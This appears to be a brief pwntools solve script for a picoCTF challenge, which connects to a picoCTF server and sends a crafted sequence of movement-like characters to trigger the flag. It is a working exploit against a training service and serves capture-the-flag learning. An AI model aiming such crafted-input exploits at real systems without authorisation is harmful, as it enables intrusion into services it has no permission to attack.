#!/usr/bin/python3
#Author: Hack.You
from pwn import *

context.log_level = 'info'
io = remote('saturn.picoctf.net', 53331)

io.sendline(b'a'*4 + b'w'*4 + b'a'*4 + b'p')
recv = io.recvall()
if b'picoCTF{' in recv:
    success(recv)
